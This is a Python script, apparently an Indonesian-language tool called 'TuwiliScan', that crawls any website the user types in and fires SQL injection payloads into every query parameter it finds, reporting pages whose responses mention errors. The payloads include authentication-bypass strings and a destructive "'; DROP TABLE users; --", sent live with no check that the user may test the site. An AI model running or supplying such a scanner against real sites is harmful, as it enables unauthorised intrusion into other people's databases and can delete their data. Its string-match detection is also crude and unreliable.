import requests
from bs4 import BeautifulSoup
import urllib.parse
from termcolor import colored

# 1. Fungsi untuk mendapatkan semua link yang memiliki parameter query
def get_links(url):
    print(colored(f"Memulai crawling pada: {url}...", 'blue'))
    try:
        response = requests.get(url)
        response.raise_for_status()  # Memastikan request berhasil (status code 200)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = []

        # Mencari semua link yang memiliki parameter query
        for link in soup.find_all('a', href=True):
            href = link['href']
            if '?' in href:  # Memeriksa apakah URL mengandung parameter query
                full_url = urllib.parse.urljoin(url, href)
                links.append(full_url)

        print(colored(f"Total {len(links)} link ditemukan di {url}", 'green'))
        return links
    except requests.exceptions.RequestException as e:
        print(colored(f"Error retrieving URL {url}: {e}", 'red'))
        return []

# 2. Fungsi untuk menguji potensi SQL Injection pada URL
def test_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR 'a'='a", "' --", "'; DROP TABLE users; --"]
    print(colored(f"Memulai tes SQL Injection pada: {url}...", 'yellow'))
    for payload in sql_payloads:
        # Menambahkan payload ke setiap parameter query URL
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        for param in query_params:
            # Membuat URL baru dengan payload
            new_query = query_params.copy()
            new_query[param] = payload
            new_url = parsed_url._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()

            try:
                response = requests.get(new_url)
                # Memeriksa jika ada kesalahan atau output yang mencurigakan
                if "error" in response.text or "SQLException" in response.text:
                    print(colored(f"[!] Potensi SQL Injection ditemukan di: {new_url}", 'red'))
                    return new_url
            except requests.exceptions.RequestException as e:
                print(colored(f"Error checking URL {new_url}: {e}", 'red'))
    print(colored(f"Tes selesai untuk URL: {url}", 'green'))
    return None

# 3. Fungsi utama untuk melakukan scanning terhadap seluruh website
def scan_website(url):
    print(colored(f"Mulai pemindaian website: {url}", 'cyan'))

    # Mengambil semua link dari halaman utama
    links = get_links(url)

    # Memindai setiap link yang ditemukan
    for idx, link in enumerate(links, start=1):
        print(colored(f"Memindai link ke-{idx}/{len(links)}: {link}", 'magenta'))
        vuln = test_sql_injection(link)
        if vuln:
            print(colored(f"Vulnerability found: {vuln}", 'red'))
        else:
            print(colored(f"Tidak ada kerentanannya pada {link}", 'green'))

# 4. Menjalankan scan pada website yang ditargetkan
def main():
    while True:
        # Logo TuwiliScan
        print(colored("""
  TTTTT  U   U  W   W  III  L      III    SSS  CCCC  AAAAA  N   N
    T    U   U  W   W   I   L       I     S    C      A   A  NN  N
    T    U   U  W W W   I   L       I     SSS  C      AAAAA  N N N
    T    U   U  WW WW   I   L       I     S    C      A   A  N  NN
    T     UUU   W   W  III  LLLLL  III     SSS  CCCC  A   A  N   N
    """, 'yellow'))

        # Meminta pengguna untuk memasukkan domain atau URL yang ingin dipindai
        website_url = input(colored("Masukkan URL yang ingin dipindai (misal: http://example.com) atau ketik 'exit' untuk keluar: ", 'green'))

        # Jika pengguna mengetik 'exit', program akan berhenti
        if website_url.lower() == 'exit':
            print(colored("Terima kasih telah menggunakan TuwiliScan. Program selesai.", 'green'))
            break

        # Memulai pemindaian
        scan_website(website_url)

# Menjalankan program
if __name__ == "__main__":
    main()
